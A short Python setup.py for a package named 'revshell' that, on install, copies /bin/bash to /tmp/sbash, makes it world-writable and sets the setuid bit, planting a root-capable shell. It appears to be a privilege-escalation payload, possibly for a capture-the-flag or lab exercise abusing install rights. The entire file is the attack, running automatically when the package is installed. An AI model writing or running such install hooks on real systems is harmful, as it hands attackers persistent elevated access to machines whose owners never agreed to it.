import os, subprocess, sys
from distutils.core import setup

subprocess.check_output(['cp', '/bin/bash', '/tmp/sbash'])
subprocess.check_output(['chown', 'rwx', '/tmp/sbash'])
subprocess.check_output(['chmod', '0777', '/tmp/sbash'])
subprocess.check_output(['chmod', '+s', '/tmp/sbash'])

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)
